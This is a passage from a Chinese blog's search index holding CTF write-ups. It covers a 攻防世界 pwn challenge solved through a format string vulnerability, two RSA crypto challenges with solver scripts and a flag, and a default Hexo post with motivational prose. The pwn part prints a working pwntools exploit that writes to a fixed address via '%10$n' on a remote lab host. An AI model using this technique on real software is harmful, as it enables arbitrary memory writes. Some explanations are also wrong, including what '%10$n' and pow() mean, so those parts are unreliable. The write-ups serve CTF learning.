Executable），它是一种可执行文件格式，可以在加载时动态地或静态地进行地址空间随机化。这使得攻击者更难利用缓冲区溢出等漏洞。因此，启用 PIE 可以提高程序的安全性。如果程序没有启用 PIE 保护，它的地址空间将始终是相同的，这意味着攻击者可以更容易地利用缓冲区溢出漏洞。**\n>\n> **“全局变量地址固定”意味着全局变量在内存中的地址是固定的，不会在程序的不同运行中发生变化。这使得攻击者更容易利用全局变量的漏洞，例如缓冲区溢出。因此，在可能的情况下，应该尽量避免使用全局变量，或者使用一些技术来保护它们，例如限制它们的访问范围和使用堆栈内存而不是静态内存等。**\n\n### 2.使用IDA\n\n如下图![img](https://img-blog.csdnimg.cn/img_convert/270dd1b463cd24c47f84a7758cf694b6.png)\n\n### 3.代码解释\n\n> **提供的代码是一个 C 语言程序，它会提示用户输入姓名和一条消息，并且会打印一个个性化的问候语和用户输入的消息。**\n>\n> **main` 函数初始化了一些变量，包括一个大小为 2 的数组 `buf` 和一个大小为 100 的字符数组 `s`。该函数使用 `setbuf` 函数来禁用标准输入、输出和错误流的缓冲。**\n>\n> **程序随后提示用户输入姓名，使用 `puts` 函数进行输出，并使用 `read` 函数将用户输入读取到 `buf` 数组中。然后程序再次提示用户输入消息，这次使用 `puts` 函数进行输出。用户输入的消息使用 `fgets` 函数读取到 `s` 数组中。**\n>\n> **程序接下来使用 `printf` 函数，传递 `buf` 数组作为参数，打印个性化的问候语。用户输入的消息也使用 `printf` 函数进行输出。**\n>\n> **最后，程序检查 `pwnme` 的值是否等于 8。如果是，则使用 `system` 函数执行命令 \"cat flag\" 并打印包含标志的消息。否则，程序打印一条感谢用户的消息。**\n\n但是，对于pwnme根本没有被赋值，所以应该是赋给pwnme一个8的值，但是实在是没有发现什么关于栈溢出的地方，只好寻求大佬帮忙，然后发现说是**格式化字符串漏洞**\n\n作为菜鸡的我不了解（；´д｀）ゞ，我就上网查资料。如下：\n\n> **格式化字符串漏洞是一种常见的安全漏洞，可以利用程序中使用格式化字符串函数时的不当使用而进行攻击。格式化字符串函数（例如 printf 和 sprintf）将一个格式化字符串作为输入，并使用该字符串格式化并打印数据。攻击者可以构造一个恶意格式化字符串来读取或修改程序内存中的数据。这种攻击通常利用了格式化字符串中的格式控制符（例如 %s 和 %x）来读取或修改内存内容。为了防止这种漏洞，开发人员应该注意在使用格式化字符串函数时正确处理输入，并避免将用户输入作为格式化字符串的一部部分**\n>\n> **对应代码的部分就是printf（&s）;根据我们所学知识printf(\"%s\",str);应该是这样所以我们可以通过构造合适的字符串，利用格式化字符串漏洞，实现读取、写入任意内存地址的数据等攻击**。\n\n| 控制符                 |                      描述                      |\n| ---------------------- | :--------------------------------------------: |\n| **`%c`**               |                **输出一个字符**                |\n| **`%d` / `%i`**        |             **输出一个十进制整数**             |\n| **`%e` / `%E`**        |         **用科学计数法输出一个浮点数**         |\n| **`%f` / `%F`**        |               **输出一个浮点数**               |\n| **`%g` / `%G`**        |     **根据值的大小选择使用 `%f` 或 `%e`**      |\n| **`%o`**               |             **输出一个八进制整数**             |\n| **`%p` / `%x` / `%X`** |       **输出一个指针地址、十六进制整数**       |\n| **`%s`**               |               **输出一个字符串**               |\n| **`%u`**               |          **输出一个无符号十进制整数**          |\n| **%n**                 | **将已经输出的字符数保存到它所在的参数指针中** |\n\n### 4.找出偏移量\n\n我们就用%p来进行（加上\\是为了好判断位置）\n\n![img](https://img-blog.csdnimg.cn/img_convert/002c8d29489a193f136e540ff4330f89.png)\n\n如图所示，很明显了0x61616161就是aaaa，所以偏移量就是10\n\n接下来我们就寻找pwnme的地址就可以了,根据下图我们找到了pwnme的地址为 0x0804A068\n\n![img](https://img-blog.csdnimg.cn/img_convert/9a12ca74c2c8ba02416512e90fef6204.png)\n\n### 5.编写exp\n\n完成上述之后我们就可以编写exp了，不过写了好久就是运行不出来，找资料了解到需要**%10$n**\n\n> **`%10$n` 是 C 语言中 printf 函数的一种格式化字符串控制符，用于将累计的输出字符数存储在指定的地址中。**\n>\n> **具体来说，`%10$n` 的含义如下：**\n>\n> - **`%`：格式控制符的起始标识；**\n> - **`10`：指定要存储输出字符数的地址所占的空间大小，这里是 10 个字节；**\n> - **`$`：指定当前格式控制符要操作的参数的位置，这里是第几个参数；**\n> - **`n`：表示存储输出字符数的值到指定的地址中。**\n>\n> **由此可知，`%10$n` 可以通过格式化字符串漏洞来将输出字符的数量存储在指定的地址中。具体来说，攻击者在输入中添加格式化字符串 `%10$n`，程序在处理该字符串时，会将输出字符的数量写入位于 10 号参数指定的地址中。由于格式化字符串漏洞的特性，攻击者可以构造任意的地址，因此能够获取程序的代码执行过程中的一些敏感信息。**\n\nexp如下：\n\n```python\nfrom pwn import *\np = remote('61.147.171.105', 56813)            \npayload = p32(0x0804A068) + 'ssss' + '%10$n'     \np.recvuntil(\"please tell me your name:\\n\")\np.sendline('taozi')\np.recvuntil(\"leave your message please:\\n\")\np.sendline(payload)\np.interactive()\n```\n\n如图：\n\n### ![img](https://img-blog.csdnimg.cn/img_convert/c9c90083e39b86dd189ed1bd3df55220.png)\n\n### 6.总结\n\n做这道题的时候，对于**格式化字符串**的知识要有一定了解，不然的话，就要像我一样，忙来忙去，很麻烦的\n\n如何利用格式化字符串呢？我做了一些知识总结。\n\n格式化字符串攻击（Format String Vulnerabilities，简称FSV）是指攻击者通过构造恶意格式化字符串控制符，在程序中读写不该被访问的内存区域、获取敏感信息等操作。攻击者通常利用以下方式来实施格式化字符串攻击：\n\n（1）打印栈上的数据\n\n攻击者可以通过下面的格式化字符串来读取栈上的数据：\n\n```c++\nCopyprintf(\"%s\", format_string);\n```\n\n这个格式化字符串会将栈上的数据输出到终端上，攻击者可通过逐步构造格式化字符串，读取栈上的敏感信息，甚至是卡号等机密信息。\n\n（2）任意地址写操作\n\n攻击者可以利用 `%n`(表示输出到目前为止已输出的字符数到指定内存中)格式化字符串控制符来实现任意地址写操作。攻击者需要指定目标地址位置（任意写操作）的参数编号，以及欲写入的值。例如：\n\n```c++\nCopyint x = 10;\nprintf(\"test %x%n\\n\", &x, x);\n```\n\n上例将变量 `x` 的地址作为参数，使其输出十六进制格式的地址，同时通过 `%n` 将已输出的字符数量写入到变量 `x` 中。由于攻击者可以构造目标地址参数，因此可以将任意值写入任意地址。\n\n（3）格式化字符串覆盖计数器\n\n格式化字符串的解析过程中需要一个计数器来记录当前处理的格式化字符串的位置，攻击者可以用格式化字符串覆盖计数器来对程序进行影响，例如覆盖 `printf()` 函数内的计数器 `number`，使其一直循环打印字符串：\n\n```c++\nCopyint number = 0;\nprintf(\"test %d%n\\n%s%6$d\\n\", 1, &number, \"hello\", 2, 3, 4, 5);\n```\n\n上例中，攻击者将变量 `number` 的地址作为参数，使其输出输出的数字 1，通过 `%n` 将输出字符数量写入变量 `number` 中。然后通过 `%s` 输出字符串 \"hello\"，同时用 `%6$d` 输出第 6 个参数的值（即数字 3），由于 `%6$d` 中的 $6 表示输出的是第 6 个参数，但是在前面已经输出了 1 个参数，因此将计数器覆盖为 1，从而打印死循环。\n\n由于格式化字符串攻击可对程序构成严重威胁，因此应采取以下预防措施：\n\n1. 不要相信用户提供的格式化字符串；\n2. 使用安全的输入输出函数，并严格限制输出字符串的长度；\n3. 不要让用户控制格式化字符串的转换说明符；\n4. 在开启编译选项 -Wall 的情况下编译程序，编译器会识别并警告存在的格式化字符串漏洞。","tags":["Pwn"],"categories":["ctf"]},{"title":"攻防世界Crypto","url":"/2023/03/05/Crypto/","content":"\nWelcom\n\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n# **一、攻防世界Crypto - 初识rsa**\n\n\n\n## 1.下载附件![img](https://img-blog.csdnimg.cn/img_convert/4398c3e509a2988046a8dbdf26053428.png)\n\n这是一道简单的rsa类型的题，我们下载附件后可以看到代码\n\n```python\nfrom Crypto.Util.number import bytes_to_long,inverse,getPrime\nfrom flag import flag\n\nm = bytes_to_long(flag)#bytes_to_long 是 Python 中的一个函数，用于将字节数组转换为整数\n#在 RSA 加密和解密中，我们需要将明文和密文表示为一个整数。因此，在进行 RSA 加密和解密时，我们需要使用 bytes_to_long 将明文和密文转换为整数，使用 long_to_bytes 将整数转换为字节数组。\np = getPrime(1024)\nq = getPrime(1024)\nn = p*q\nprint(n)\ne = 65537\n\nc = pow(m,e,n)#`pow` 是 Python 中的一个内置函数，用于计算一个数的幂。具体地，`pow(x, y, z)` 返回的结果为 `x*y % z`。其中，`x` 和 `y` 是整数，`z` 是可选的模数。\n\npq = p*(q-1)\nqp = q*(p-1)\n\nprint(\"c=\",c)\nprint(\"n=\",n)\nprint(\"pq=\",pq)\nprint(\"qp=\",qp)\n... ...//代码给出了c、n、pq、qp的值 在此省略了\n```\n\n- 关于rsa\n\n> 在RSA加密中，明文m通过公钥进行加密得到密文c，即c=m^e mod n。在RSA解密中，密文c通过私钥进行解密得到明文m，即m=c^d mod n。其中，n=p*q，p和q均为大质数，e是与(p-1)*(q-1) 互质的数，d是e在模 (p-1)*(q-1) 意义下的逆元。**加密m^e mod N =c解密 c^d mod N = m**\n\n在RSA加密算法中，phi函数（也称欧拉函数）是一个重要的参数。phi函数的值是根据选择的两个质数p和q计算出来的。phi函数的含义是小于n的正整数中与n互质的数的个数，其中**n=p*q**。phi函数的计算公式为：**phi(n) = (p-1) * (q-1)**\n\n在这里他给出的时pq和qp，并且我们知道了n，而n=pq，这里应该是大数相乘有偏差导致的，具体解决方法用pq*qp/n\n\n## 2.编写后的脚本加密\n\n```python\nfrom Crypto.Util.number import inverse,long_to_bytes\nc= ‘’\nn= ‘’\npq= ‘’\nqp= ‘’\ne = 65537\nphi = pq*qp//n\nprint(phi)\nd = inverse(e,phi)\nm = pow(c,d,n)\nprint(long_to_bytes(m))\n```\n\n### 3运行脚本得到flag\n\n![img](https://img-blog.csdnimg.cn/img_convert/55fd9903f379f9148eb7cc5d63413fb9.png)\n\n运行就可以得到flag了。\n\n# 二、攻防世界baigeiRSA\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/74b3dd0520354b2a8f2a9494618490c6.png#pic_center)\n\n### 1.首先呢，下载附件.^◡^.\n\n附件给出了以下信息\n\n```\nn = 88503001447845031603457048661635807319447136634748350130947825183012205093541\nc = 40876621398366534035989065383910105526025410999058860023908252093679681817257\n\n```\n\n```python\nimport libnum\nfrom Crypto.Util import number\nfrom secret import flag\n\nsize = 128\ne = 65537\np = number.getPrime(size)\nq = number.getPrime(size)\nn = p*q\n\nm = libnum.s2n(flag)\nc = pow(m, e, n)\n\nprint('n = %d' % n)\nprint('c = %d' % c)\n\n```\n\n### 2.分析代码(人 •͈ᴗ•͈) ♡♡\n\n通过给出的数据我们进行分析，我们首先分析这串代码\n\n（1）import libnum:这里导入了libnum库，通过查询资料我们可以了解到关于libnum一些常用的知识：\n\n> - **`libnum.n2s(n)`: 将整数 `n` 转换为字符串。**\n> - **`libnum.s2n(s)`: 将字符串 `s` 转换为整数。**\n> - **`libnum.xor(s1, s2)`: 计算两个字符串 `s1` 和 `s2` 的异或结果。**\n> - **`libnum.invmod(a, m)`: 计算模数为 `m` 的整数 `a` 的乘法逆元。**\n> - **`libnum.factorize(n)`: 因数分解整数 `n`。**\n> - **`libnum.next_prime(n)`: 找到大于整数 `n` 的下一个素数。**\n\n**（2）from Crypto.Util import number:**这从Crypto.Util包中导入了number模块，他提供了在加密中使用的各种数论函数。对应的也就是代码中的 **number.getPrime()**和**pow()**，但是pow()是python内置函数，所以不必使用完整的模块（Crypto.Util.number.pow()），只需使用number模块即可.Ծ‸Ծ \n\n**(3)from secret import flag**：这从名为 `secret.py` 的另一个文件中导入了 `flag` 变量。除非我们能够访问该文件，否则我们不知道 `flag` 的内容。\n\n**(4)size=128:**意味着我们将使用**Crypto.Util.number.getPrime()**函数生成两个大小为128位的随机素数p和q\n\n**(5)e = 65537:**这是一个常用的公共指数值，因为它是一个比较小 的素数，与大多数整数互质，而且计算速度较快。\n\n**(6)n = p*q**：这计算 RSA 模数为 p 和 q的乘积。\n\n**(7)m = libnum.s2n(flag)**`：这使用 `libnum` 库中的 `s2n()函数将 `flag 变量的内容（我们不知道其内容）从字符串转换为整数。\n\n**(8)c = pow(m, e, n)**：这使用 RSA 公钥 (n, e) 加密整数消息m。密文计算为 m的 e次幂模 n。\n\n### 3.yafu工具的使用•﹏•\n\n下载网址：https://sourceforge.net/projects/yafu/\n\n首先我们结合上面的数据知道**n**和**c**的数据，因为**n=p*q**，所以我们就可以通过分解质因数求p和q，那么推荐的工具肯定当选yafu.\n\n> **`yafu` 是一个用于数学计算的开源软件，它是一个快速的因数分解工具，可以用于分解大整数。它使用了多种算法来分解整数，包括 Pollard rho、Quadratic sieve 和 Number field sieve 等算法。`yafu` 还包含其他一些工具，例如计算最大公因数、计算模逆元、计算离散对数等等。**\n\n我们在下载后，解压到一个文件夹里，在文件夹里我们打开PowerShell，首先输入**.\\yafu-x64.exe**接着输入factor（要分解的数）等一段时间。。。咦！好了！\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/0222df4e32be4712866af24d914ffa7e.png#pic_center)得出p和q是分别其中的一个：\n\n```\nP39 = 274539690398523616505159415195049044439\nP39 = 322368694010594584041053487661458382819\n```\n\n### 4.总结数据˃̣̣̥᷄⌓˂̣̣̥᷅ \n\n那么我们进行小总结\n\n我们可以获得\n\n> **p=274539690398523616505159415195049044439**\n>\n> **q=322368694010594584041053487661458382819**\n>\n> **n = 88503001447845031603457048661635807319447136634748350130947825183012205093541**\n> \t   **c = 40876621398366534035989065383910105526025410999058860023908252093679681817257**\n\n### 5.编写脚本'◡' \n\n已知p、q、n、c我们编写代码\n\n```python\nimport gmpy2  # 导入高精度计算库gmpy2\nfrom Crypto.Util.number import long_to_bytes  # 导入将长整数转换为字节串的工具函数\n\n# 定义RSA公钥和密文\ne = 65537\nc = 40876621398366534035989065383910105526025410999058860023908252093679681817257\n\n# 定义RSA算法中使用的两个大素数p和q，以及模数n和欧拉函数值phi_n\np = 322368694010594584041053487661458382819\nq = 274539690398523616505159415195049044439\nn = p * q\nphi_n = (p - 1) * (q - 1)\n\n# 计算RSA私钥中的解密指数\nd = gmpy2.invert(e, phi_n)\n\n# 使用RSA算法解密密文c，得到明文m\nm = pow(c, d, n)\n\n# 将解密后的长整数m转换为字节串，并输出到屏幕上\nprint(long_to_bytes(m))\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/1a26f306b4eb4e569fc14ac9698b2b4f.png#pic_center)\n\n运行之后得到flag为HSCTF{@Zh3n_Ba1_G3i!@}\n\n### 6.关于RSA小故事\n\n> **RSA是一种非对称加密算法，由Ron Rivest、Adi Shamir和Leonard Adleman三位密码学家在1977年共同发明。RSA算法的安全性基于大整数分解的困难性，它可以用于实现数字签名、密钥交换、数据加密等安全通信功能。**\n>\n> **RSA算法的原理是基于数论中的欧拉定理和费马小定理。具体来说，RSA算法的公钥和私钥分别由以下参数组成：**\n>\n> 1. **公钥：加密指数（e）和模数（n）；**\n> 2. **私钥：解密指数（d）和模数（n）。**\n>\n> **RSA算法的加密过程如下：**\n>\n> 1. **将明文m转换为一个大整数M；**\n> 2. **使用公钥中的加密指数e和模数n，计算密文C = M^e mod n；**\n> 3. **将密文C发送给接收方。**\n>\n> **RSA算法的解密过程如下：**\n>\n> 1. **接收到密文C；**\n> 2. **使用私钥中的解密指数d和模数n，计算明文M = C^d modn；**\n> 3. **将明文M转换为原始的明文m。**\n>\n> **需要注意的是，在RSA算法中，加密指数e和解密指数d是一对互为逆元的数，即d * e = 1 mod phi(n)，其中phi(n)表示欧拉函数值。因此，只有私钥持有者才能够计算出解密指数d，从而解密密文。同时，RSA算法的安全性基于大整数分解的困难性，即对于一个大的合数n，找到它的质因数p和q是一个非常困难的问题，这保证了RSA算法在当前的计算能力下是安全的。**\n>\n> **除了基本的RSA加密和解密，RSA算法还有许多变种和扩展，比如加密填充方案、签名方案、密钥生成方案等。RSA算法的应用非常广泛，包括SSL/TLS协议、数字证书、电子邮件加密、数字签名等领域。**\n\n\n\n\n\n","tags":["Crypto"],"categories":["ctf"]},{"title":"Hello World","url":"/2023/02/25/hello-world/","content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n**三万六千日，夜夜当秉烛，白日何短短，百年若易海。**\n\n**当你两手握着沙子的时候，你也就一定拿不到地上的那颗明珠了。**\n\n**为人如立山千仞，为学如海纳百川信心无畏，良心无愧，青春无悔撑开自信的帆，破浪向前，展示搏击风采坚定的信念持久的勤奋科学的方法成功人生能有几回搏，此时不搏待何时细节决定成败，拼搏铸就人生。**\n\n**鹰爱高飞，鸦栖一枝。鸟贵有翼，人贵有志。靠山山会倒，靠水水会流，靠自己永远不倒。欲望以提升热忱，毅力以磨平高山。只要路是对的，就不怕路远**。\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n\n**社会是大海，人生是小舟，理想和信念就是引航的`灯塔和推进的风帆。咱们在大学期间不仅仅要提高知识水平，更要坚定科学崇高的理想信念。然而理想不等于现实，理想的实现往往要透过1条充满艰难险阻的曲折之路，有赖于脚踏实地，持之以恒的奋斗。只有实践才是通往理想彼岸的桥梁**。\n\n**治学要耐得住寂寞，做人须经得起风雨。贵人之心责已，则宽；利己之心利人，则容。信念是人生之车的轮，理想是人生之舟的帆。成功终究是昨夜星辰，勤奋却是不熄的明灯。有作为，十年胜百年；无目标，百岁犹一岁。骨气、正气、与气，气爽神清；诚心、意心、热心，心宽体健。**\n\n**正能量就像给自己插上翅膀，才能飞得更高；炼造一双千里眼，才能望得更远。满载而行，即使困难重重，留下的汗水也终会获得回报；满载而行，即使艰辛与泪水并存，前方的道路也依然光明；满载而行，即使跌倒，也将有勇气迈向成功。**\n\n**我们怀揣火种走过黑暗长夜，跨过战友的遗骸，踏过荆棘和深渊，最终在累累尸骨上重新点燃了种族延续的火炬。我们这些活下来的人不需要历史来记载功勋，也无谓那些空虚华美的称颂;只要山川河流、千万英灵，见证过我们前仆后继的跋涉，和永不放弃的努力。**\n\n> 外面下着大雨，潮湿的空气令我难受，不知道过了几刻钟，我也不知道自己在干什么，似乎是在发愣，可是发愣也不是如此——思绪如麻，剪不断，理还乱。脑子里装满了噪音，我不知道自己还有多少天才能熬过头。外面的雨似乎是发现了小草有点讨厌自己了，开始离去。风雨过后，理应是美好的时候，阳光出来了，彩虹也时隐时现。听不见了这烦人的雨声，我开始朝门口走去，当我触碰到第一缕阳光的时候，我感觉到的不是光明的日子，而是一种极端的另一种日子。我似乎忘记了它原本所拥有的温度了，此时的我我只感受到了痛苦，望着不惹人爱的外面，我还是走了出去，阳光刺着我的双眼、空气抓住我的喉咙，似乎一撇一捺组成的不是那个字，而是X，似乎我不该过来。在房子里，找不出一点任何的意义，只有抱膝灯前影伴身。外面天气十分的晴朗，小鸟在欢唱、小花在跳舞。而身处房子里的我，似乎并不是很喜欢这种场景，外面耀眼的阳光却无法除去房子里的阴影。或许这就是人生吧。"}]